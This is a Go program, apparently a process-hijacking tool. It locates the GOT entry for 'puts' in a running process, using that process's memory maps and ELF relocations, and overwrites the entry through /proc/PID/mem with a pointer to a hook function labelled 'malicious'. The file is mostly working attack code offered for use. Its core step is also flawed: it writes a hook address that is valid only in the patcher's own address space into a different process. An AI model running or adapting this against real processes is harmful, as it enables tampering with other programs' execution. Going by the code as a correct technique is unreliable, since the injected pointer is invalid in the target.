package main

import (
	"bufio"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
	"unsafe"
)

/*
#include <stdio.h>
// This is the malicious function we will redirect execution to
void hacked_puts(const char *str) {
    printf("[!] HIJACKED: Successfully executed via pure Go GOT Patch!\n");
}
*/
import "C"

// 1. Parse /proc/$PID/maps to find the base load address of the target binary
func getProcessBaseAddress(pid string) (uint64, error) {
	mapsPath := fmt.Sprintf("/proc/%s/maps", pid)
	file, err := os.Open(mapsPath)
	if err != nil {
		return 0, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	if scanner.Scan() {
		line := scanner.Text()
		// Line format: 555555554000-555555558000 r--p 00000000 08:01 123456 /path/to/target
		fields := strings.Fields(line)
		if len(fields) > 0 {
			addrRange := strings.Split(fields[0], "-")
			baseAddr, err := strconv.ParseUint(addrRange[0], 16, 64)
			if err != nil {
				return 0, err
			}
			return baseAddr, nil
		}
	}
	return 0, fmt.Errorf("could not parse memory maps")
}

// 2. Parse ELF structures manually to find the GOT relocation offset for a symbol
func getGotOffset(exePath string, symbolName string) (uint64, error) {
	f, err := elf.Open(exePath)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	// Get the dynamic symbol table to match the symbol name string
	dynSyms, err := f.DynamicSymbols()
	if err != nil {
		return 0, fmt.Errorf("failed to read dynamic symbols: %v", err)
	}

	// Relocation sections hold the mapping to the GOT slots
	for _, sec := range f.Sections {
		if sec.Type == elf.SHT_RELA || sec.Type == elf.SHT_REL {
			data, err := sec.Data()
			if err != nil {
				continue
			}

			// Parse entries based on ELF class (64-bit implementation here)
			entrySize := 24 // Size of Elf64_Rela structure (Addr, Info, Addend)
			if sec.Type == elf.SHT_REL {
				entrySize = 16 // Elf64_Rel
			}

			for i := 0; i < len(data); i += entrySize {
				var offset, info uint64
				if f.Class == elf.ELFCLASS64 {
					offset = binary.LittleEndian.Uint64(data[i : i+8])
					info = binary.LittleEndian.Uint64(data[i+8 : i+16])
				} else {
					continue // Simplification: focus on 64-bit architecture
				}

				// Extract symbol index from relocation info
				symIdx := info >> 32
				if symIdx > 0 && int(symIdx-1) < len(dynSyms) {
					sym := dynSyms[symIdx-1]
					if sym.Name == symbolName {
						// This offset is the relative location of the GOT slot
						return offset, nil
					}
				}
			}
		}
	}
	return 0, fmt.Errorf("symbol relocation entry not found")
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: sudo ./patcher <PID>")
		return
	}
	pid := os.Args[1]
	exePath := fmt.Sprintf("/proc/%s/exe", pid)

	fmt.Println("[+] Phase 1: Resolving dynamic offsets...")
	// Dynamically calculate the GOT offset on disk
	gotOffset, err := getGotOffset(exePath, "puts")
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	fmt.Printf("[+] Found relative GOT offset for 'puts': 0x%X\n", gotOffset)

	// Dynamically calculate the live base memory address of the process
	baseAddress, err := getProcessBaseAddress(pid)
	if err != nil {
		fmt.Printf("[-] Error reading maps: %v\n", err)
		return
	}
	fmt.Printf("[+] Found target runtime base address (ASLR): 0x%X\n", baseAddress)

	// Calculate the true, runtime address of the GOT pointer
	targetGotPutsAddr := baseAddress + gotOffset
	fmt.Printf("[+] Calculated live GOT memory location: 0x%X\n", targetGotPutsAddr)

	// Capture our malicious injection function address
	hookAddress := uint64(uintptr(unsafe.Pointer(C.hacked_puts)))
	fmt.Printf("[+] Hook function mapped at local memory: 0x%X\n", hookAddress)

	fmt.Println("[+] Phase 2: Injecting into running process...")
	memPath := fmt.Sprintf("/proc/%s/mem", pid)
	memFile, err := os.OpenFile(memPath, os.O_RDWR, 0666)
	if err != nil {
		fmt.Printf("[-] Failed to open target process memory. Are you root? %v\n", err)
		return
	}
	defer memFile.Close()

	// Convert our hook function pointer to raw bytes to write into the target's RAM
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, hookAddress)

	// Write directly over the target's dynamic link table pointer
	_, err = memFile.WriteAt(buf, int64(targetGotPutsAddr))
	if err != nil {
		fmt.Printf("[-] Memory write failed: %v\n", err)
		fmt.Println("[*] Note: If writing fails, the target page might be protected as Read-Only.")
	} else {
		fmt.Println("[+] Success! GOT pointer overwritten dynamically.")
	}
}
